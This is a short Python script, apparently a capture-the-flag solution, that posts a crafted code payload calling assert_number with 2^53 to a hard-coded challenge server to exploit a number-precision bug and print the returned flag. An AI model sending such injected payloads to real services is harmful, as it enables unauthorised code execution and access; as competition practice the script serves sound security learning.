import requests

host = "http://35.207.132.47/wee/run"
code = "9007199254740992"

check = {"code": "alert(assert_number("+code+"))"}
flag_request = requests.post(host, json=check)
flag = flag_request.json()["result"].strip()
print(flag)
